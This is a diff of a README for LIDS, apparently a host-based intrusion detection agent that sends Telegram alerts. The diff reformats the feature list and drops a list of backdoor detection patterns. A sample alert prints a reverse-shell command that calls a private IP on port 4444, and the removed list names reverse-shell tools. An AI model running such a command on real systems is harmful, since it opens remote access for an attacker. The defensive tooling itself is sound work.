@@ -1,3 +1,11 @@
+<p align="center">
+<img src="https://img.shields.io/github/stars/Yescrypt/lids?style=for-the-badge">
+<img src="https://img.shields.io/github/forks/Yescrypt/lids?style=for-the-badge">
+<img src="https://img.shields.io/github/issues/Yescrypt/lids?style=for-the-badge">
+<img src="https://img.shields.io/github/license/Yescrypt/lids?style=for-the-badge">
+<img src="https://img.shields.io/github/v/release/Yescrypt/lids?style=for-the-badge">
+</p>
+
 <div align="center">
 
 # 🛡️ LIDS
@@ -6,8 +14,8 @@
 
 **Real-time attack detection · Telegram alerts**
 
-Lightweight host-based security agent for **Kali Linux, Parrot OS, and Arch Linux**.  
-Real-time alerts via Telegram · One-line install.
+Lightweight host-based security monitoring agent for  
+**Kali Linux · Parrot OS · Arch Linux**
 
 <br>
 
@@ -17,12 +25,10 @@ Real-time alerts via Telegram · One-line install.
 <img src="https://skillicons.dev/icons?i=python" width="48"><br>
 <b>Python</b>
 </td>
-
 <td align="center" width="120">
 <img src="https://skillicons.dev/icons?i=linux" width="48"><br>
 <b>Linux</b>
 </td>
-
 <td align="center" width="120">
 <img src="https://cdn.simpleicons.org/opensourceinitiative/3DA639" width="48"><br>
 <b>MIT</b>
@@ -37,14 +43,15 @@ Real-time alerts via Telegram · One-line install.
 ## Features
 
 | Module | What it detects |
-|--------|----------------|
-| **Port Monitor** | New ports opened, suspicious port numbers (4444, 1337, etc.) |
-| **SSH Monitor** | Weak SSH config, PermitRootLogin, PasswordAuth |
-| **Log Monitor** | Brute force attacks, root logins, sudo abuse |
-| **Backdoor Scanner** | Reverse shells, cron backdoors, SUID abuse, SSH key injection, LD_PRELOAD, hidden root users, webshells, rootkit indicators |
-| **Process Monitor** | Miners, C2 tools, processes from /tmp |
-| **Malware Scan** | rkhunter, chkrootkit integration |
-| **Firewall** | Block IP/port via iptables or ufw with duration timer |
+|------|------|
+| **Port Monitor** | New ports opened, suspicious ports (4444,1337 etc.) |
+| **SSH Monitor** | Weak SSH configs, root login, password auth |
+| **Log Monitor** | Brute force attacks, login abuse |
+| **Backdoor Scanner** | Reverse shells, cron persistence |
+| **Process Monitor** | Cryptominers, suspicious binaries |
+| **Malware Scan** | rkhunter / chkrootkit integration |
+| **Firewall Control** | Block IP with iptables / ufw |
+| **Telegram Alerts** | Real-time attack notifications |
 
 ---
 
@@ -53,35 +60,20 @@ Real-time alerts via Telegram · One-line install.
 ```bash
 git clone https://github.com/Yescrypt/lids
 cd lids
-sudo bash ./install.sh
+sudo bash install.sh
 ```
 
 Installer asks:
-- Hostname label
-- OS name
-- Telegram User ID
 
-Then LIDS registers with the server and starts monitoring.
+- Hostname label  
+- OS name  
+- Telegram User ID  
 
-
-## Backdoor Detection
-
-LIDS detects post-exploitation artifacts:
-
-- **Reverse shells** — bash -i, /dev/tcp, nc -e, socat, python sockets
-- **Cron backdoors** — suspicious entries in /etc/cron.d, /var/spool/cron
-- **Startup persistence** — rc.local, .bashrc, .profile, systemd units
-- **SUID abuse** — unexpected SUID/SGID binaries
-- **SSH key injection** — new keys added to authorized_keys
-- **LD_PRELOAD hijacking** — /etc/ld.so.preload or env injection
-- **Hidden root users** — UID 0 accounts besides root
-- **/tmp executables** — binaries running from /tmp, /dev/shm
-- **Webshells** — PHP/ASP shells in web roots
-- **Rootkit indicators** — hidden PIDs, suspicious system files
+LIDS then registers and starts monitoring.
 
 ---
 
-## Telegram Alerts
+## Telegram Alert Example
 
 ```
 🚨 SSH Brute Force Attack
@@ -89,18 +81,17 @@ LIDS detects post-exploitation artifacts:
 Host: kali-lab
 IP: 185.x.x.x
 Attempts: 32
-Window: 120s
 
-[🚫 BLOCK IP] [🔍 WHOIS] [✅ IGNORE]
+[🚫 BLOCK IP] [🔍 WHOIS] [IGNORE]
 ```
 
 ```
-🚨 REVERSE SHELL DETECTED
+🚨 Reverse Shell Detected
 
 PID: 2211
 CMD: bash -i >& /dev/tcp/192.168.1.5/4444
 
-[☠️ KILL NOW] [🔍 TRACE] [✅ IGNORE]
+[KILL] [TRACE] [IGNORE]
 ```
 
 ---
@@ -111,12 +102,10 @@ CMD: bash -i >& /dev/tcp/192.168.1.5/4444
 
 ```json
 {
-    "agent_id": "...",
-    "auth_key": "...",
-    "scan_interval": 30,
-    "whitelist_ports": [80, 443, 22, 53],
-    "whitelist_processes": ["nmap", "netcat", "nc"],
-    "whitelist_ips": []
+  "scan_interval": 30,
+  "whitelist_ports": [22,80,443],
+  "whitelist_processes": ["nmap","netcat"],
+  "whitelist_ips": []
 }
 ```
 
@@ -125,15 +114,22 @@ CMD: bash -i >& /dev/tcp/192.168.1.5/4444
 ## Commands
 
 ```bash
-systemctl status lids    # Check status
-systemctl restart lids   # Restart
-tail -f /var/log/lids/lids.log  # Logs
+systemctl status lids
+systemctl restart lids
+tail -f /var/log/lids/lids.log
 ```
+
+---
+
+## Security
+
+Report vulnerabilities responsibly:
+
+@anonim_xatbot
+
 ---
 
 ## License
 
-MIT License © 2026 LIDS Contributors
-
-This project is licensed under the MIT License.  
-See the <img src="https://cdn-icons-png.flaticon.com/512/1208/1208147.png" width="20"> [MIT](LICENSE) file for details.
+MIT License © 2026 LIDS Contributors  
+See the [LICENSE](LICENSE) file for details.
